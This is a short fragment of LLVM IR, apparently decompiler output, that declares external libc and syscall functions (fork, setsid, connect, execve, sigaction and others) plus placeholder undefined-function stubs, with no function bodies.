declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

declare float @fabsf(float)

attributes #0 = { noreturn }
